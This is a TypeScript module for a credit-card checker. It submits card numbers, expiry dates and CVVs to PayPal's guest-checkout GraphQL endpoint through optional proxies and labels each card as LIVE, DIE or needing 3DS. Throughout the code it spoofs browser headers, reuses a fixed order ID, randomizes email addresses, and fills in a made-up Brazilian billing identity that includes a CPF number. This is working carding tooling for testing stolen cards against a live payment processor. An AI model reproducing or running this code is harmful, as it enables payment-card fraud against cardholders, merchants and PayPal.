import axios from "axios";

export interface PayPalCheckResult {
  status: "APPROVED" | "LIVE" | "VBV" | "DIE" | "ERROR";
  categoria: "LIVE" | "DIE" | "UNKNOWN";
  message: string;
  code?: string;
  rawResponse: string;
}

export interface PayPalCheckInput {
  cardNumber: string;
  expiryMonth: string;
  expiryYear: string;
  cvv: string;
  proxy?: string;
  orderId?: string;
  installmentTerm?: number;
}

function getCardBrand(cardNumber: string): string {
  const firstDigit = cardNumber.charAt(0);
  const firstTwo = cardNumber.substring(0, 2);
  
  if (firstDigit === "4") return "VISA";
  if (firstTwo >= "51" && firstTwo <= "55") return "MASTER_CARD";
  if (firstTwo === "34" || firstTwo === "37") return "AMERICAN_EXPRESS";
  if (cardNumber.substring(0, 4) === "6011") return "DISCOVER";
  
  return "UNKNOWN";
}

function formatExpiryYear(year: string): string {
  if (year.length === 4) return year;
  return `20${year}`;
}

function formatExpiryMonth(month: string): string {
  return month.padStart(2, "0");
}

export function categorizePayPalResponse(response: any, rawResponse: string): PayPalCheckResult {
  const result: PayPalCheckResult = {
    status: "DIE",
    categoria: "DIE",
    message: "✗ Cartão inválido",
    code: "",
    rawResponse
  };

  if (response?.errors && Array.isArray(response.errors)) {
    for (const error of response.errors) {
      if (error?.data?.[0]?.code) {
        const code = error.data[0].code;
        const codeUpper = code.toUpperCase();
        result.code = code;

        if (codeUpper === 'APPROVED') {
          result.status = 'APPROVED';
          result.categoria = 'LIVE';
          result.message = '✓ Transação aprovada';
        } else if (codeUpper === '3DS_REQUIRED') {
          result.status = 'VBV';
          result.categoria = 'LIVE';
          result.message = '⚠ 3DS necessário';
        } else if ([
          'EXISTING_ACCOUNT_RESTRICTED',
          'RISK_DISALLOWED',
          'INVALID_SECURITY_CODE',
          'INVALID_BILLING_ADDRESS',
          'INVALID_EXPIRATION_DATE',
          'INSUFFICIENT_FUNDS',
          'CC_INVALID_CSC'
        ].includes(codeUpper)) {
          result.status = 'LIVE';
          result.categoria = 'LIVE';
          result.message = '💳 Cartão válido';
        } else {
          result.status = 'DIE';
          result.categoria = 'DIE';
          result.message = '✗ Cartão inválido';
        }
        return result;
      }
    }
  }

  if (response?.data?.approveGuestPaymentWithCreditCard) {
    result.status = 'APPROVED';
    result.categoria = 'LIVE';
    result.message = '✓ Transação aprovada';
    result.code = 'APPROVED';
  }

  return result;
}

export async function checkCardWithPayPal(
  input: PayPalCheckInput
): Promise<PayPalCheckResult> {
  try {
    const axiosConfig: any = {
      timeout: 30000,
      validateStatus: () => true,
    };

    if (input.proxy) {
      const parts = input.proxy.split(":");
      if (parts.length >= 2) {
        const host = parts[0];
        const port = parseInt(parts[1]);
        const username = parts[2];
        const password = parts[3];
        
        axiosConfig.proxy = {
          protocol: 'http',
          host,
          port,
          ...(username && password ? { auth: { username, password } } : {})
        };
      }
    }

    const client = axios.create(axiosConfig);
    const orderId = input.orderId || "5ST50483YA8267111"; // Fallback para o ID do PHP se não fornecido

    const expiryMonth = formatExpiryMonth(input.expiryMonth);
    const expiryYear = formatExpiryYear(input.expiryYear);
    const brand = getCardBrand(input.cardNumber);
    const email = `crow.sntn${Math.floor(Math.random() * 900) + 100}@gmail.com`;

    const graphqlQuery = {
      query: `
        mutation payWithCard(
            $token: String!
            $card: CardInput
            $paymentToken: String
            $phoneNumber: String
            $firstName: String
            $lastName: String
            $shippingAddress: AddressInput
            $billingAddress: AddressInput
            $email: String
            $currencyConversionType: CheckoutCurrencyConversionType
            $installmentTerm: Int
            $identityDocument: IdentityDocumentInput
            $feeReferenceId: String
        ) {
            approveGuestPaymentWithCreditCard(
                token: $token
                card: $card
                paymentToken: $paymentToken
                phoneNumber: $phoneNumber
                firstName: $firstName
                lastName: $lastName
                email: $email
                shippingAddress: $shippingAddress
                billingAddress: $billingAddress
                currencyConversionType: $currencyConversionType
                installmentTerm: $installmentTerm
                identityDocument: $identityDocument
                feeReferenceId: $feeReferenceId
            ) {
                flags {
                    is3DSecureRequired
                }
                cart {
                    intent
                    cartId
                    buyer {
                        userId
                        auth {
                            accessToken
                        }
                    }
                    returnUrl {
                        href
                    }
                }
                paymentContingencies {
                    threeDomainSecure {
                        status
                        method
                        redirectUrl {
                            href
                        }
                        parameter
                    }
                }
            }
        }
      `,
      variables: {
        token: orderId,
        card: {
          cardNumber: input.cardNumber,
          type: brand,
          expirationDate: `${expiryMonth}/${expiryYear}`,
          securityCode: input.cvv,
          productClass: "CREDIT"
        },
        firstName: "Rosangela",
        lastName: "Ferreira",
        email: email,
        billingAddress: {
          givenName: "Rosangela",
          familyName: "Ferreira",
          state: "SP",
          country: "BR",
          postalCode: "06535110",
          line1: "Avenida Baptista Borba, 863",
          line2: "Casa",
          city: "Santana de Parnaiba"
        },
        currencyConversionType: 'PAYPAL',
        installmentTerm: input.installmentTerm || 1,
        identityDocument: {
          value: "08471416832",
          type: 'CPF'
        }
      }
    };

    const response = await client.post(
      "https://www.paypal.com/graphql?fetch_credit_form_submit",
      graphqlQuery,
      {
        headers: {
          'accept': 'application/json',
          'content-type': 'application/json',
          'origin': 'https://www.paypal.com',
          'referer': 'https://www.paypal.com/',
          'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36',
          'x-app-name': 'standardcardfields',
          'x-country': 'BR',
          'paypal-client-context': orderId,
          'paypal-client-metadata-id': orderId
        }
      }
    );

    return categorizePayPalResponse(response.data, JSON.stringify(response.data));
  } catch (error: any) {
    const errorMessage = error.message || "Erro desconhecido";
    return {
      status: "ERROR",
      categoria: "UNKNOWN",
      message: `Erro ao conectar com PayPal: ${errorMessage}`,
      rawResponse: errorMessage,
    };
  }
}
